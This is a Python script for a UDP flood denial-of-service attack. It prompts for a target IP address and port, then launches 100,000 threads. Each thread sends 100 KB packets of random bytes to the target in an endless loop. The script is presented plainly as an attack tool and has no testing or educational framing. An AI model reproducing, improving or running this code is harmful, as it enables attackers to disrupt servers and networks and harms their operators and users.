import socket
import threading
import os


target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port number (80 for HTTP): "))


payload_size = 1024 * 100  
message = os.urandom(payload_size)


def attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(message, (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port}")
        except socket.error:
            print("Failed to send packet.")
        finally:
            sock.close()


threads_count = 100000


for _ in range(threads_count):
    thread = threading.Thread(target=attack)
    thread.start()
